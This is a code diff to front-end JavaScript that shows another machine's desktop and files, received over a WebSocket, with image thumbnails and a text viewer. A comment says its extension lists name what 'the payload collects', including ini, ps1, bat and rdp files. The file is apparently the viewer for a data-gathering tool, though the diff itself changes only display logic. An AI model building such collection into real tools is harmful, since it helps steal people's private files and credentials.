@@ -4,7 +4,7 @@ let currentPath = [];
 let imageData = {};
 let textData = {};
 
-// All text-based extensions the payload collects
+// All extensions the payload collects
 const textExtensions = ['txt', 'log', 'csv', 'xml', 'json', 'ini', 'bat', 'ps1', 'rdp'];
 const imageExtensions = ['jpg', 'jpeg', 'png', 'webp', 'gif', 'bmp'];
 
@@ -91,7 +91,6 @@ function renderDesktop() {
   if (!desktopNode) return;
 
   const desktop = document.getElementById('desktop');
-  // Preserve the wallpaper when clearing icons
   const bg = desktop.style.backgroundImage;
   desktop.innerHTML = '';
   desktop.style.backgroundImage = bg;
@@ -115,13 +114,15 @@ function renderDesktop() {
       if (imageExtensions.includes(ext) && imageData[fullPath]) {
         const mimeTypes = {'png':'image/png','jpg':'image/jpeg','jpeg':'image/jpeg','gif':'image/gif','webp':'image/webp','bmp':'image/bmp'};
         img.src = `data:${mimeTypes[ext]||'image/png'};base64,${imageData[fullPath]}`;
+      } else if (textData[fullPath]) {
+        img.src = '/images/txt.png';
       } else {
         img.src = getIconPath(childName, false);
       }
       div.addEventListener('dblclick', () => {
         if (imageExtensions.includes(ext)) {
           ImageViewer(fullPath);
-        } else if (textExtensions.includes(ext)) {
+        } else if (textExtensions.includes(ext) || textData[fullPath]) {
           TextViewer(fullPath);
         }
       });
@@ -176,21 +177,19 @@ function renderFileExplorer() {
       const ext = childName.split('.').pop().toLowerCase();
       const fullPath = currentPath.length > 0 ? currentPath.join('\\') + '\\' + childName : childName;
 
-      if (imageExtensions.includes(ext)) {
-        if (imageData[fullPath]) {
-          const imageTypes = {
-            'png': 'image/png',
-            'jpg': 'image/jpeg',
-            'jpeg': 'image/jpeg',
-            'gif': 'image/gif',
-            'webp': 'image/webp',
-            'bmp': 'image/bmp'
-          };
-          const image = imageTypes[ext] || 'image/png';
-          img.src = `data:${image};base64,${imageData[fullPath]}`;
-        } else {
-          img.src = '/images/file.png';
-        }
+      if (imageExtensions.includes(ext) && imageData[fullPath]) {
+        const imageTypes = {
+          'png': 'image/png',
+          'jpg': 'image/jpeg',
+          'jpeg': 'image/jpeg',
+          'gif': 'image/gif',
+          'webp': 'image/webp',
+          'bmp': 'image/bmp'
+        };
+        const image = imageTypes[ext] || 'image/png';
+        img.src = `data:${image};base64,${imageData[fullPath]}`;
+      } else if (textData[fullPath]) {
+        img.src = '/images/txt.png';
       } else {
         img.src = getIconPath(childName, false);
       }
@@ -203,7 +202,7 @@ function renderFileExplorer() {
       childDiv.addEventListener('dblclick', () => {
         if (imageExtensions.includes(ext)) {
           ImageViewer(fullPath);
-        } else if (textExtensions.includes(ext)) {
+        } else if (textExtensions.includes(ext) || textData[fullPath]) {
           TextViewer(fullPath);
         }
       });
@@ -276,7 +275,7 @@ ws.onmessage = (event) => {
 
   } else if (msg.type === 'image') {
     imageData[msg.data.path] = msg.data.base64;
-    renderDesktop(); // Re-render so thumbnails update with the image data
+    renderDesktop();
 
   } else if (msg.type === 'wallpaper') {
     const data = msg.data.base64;
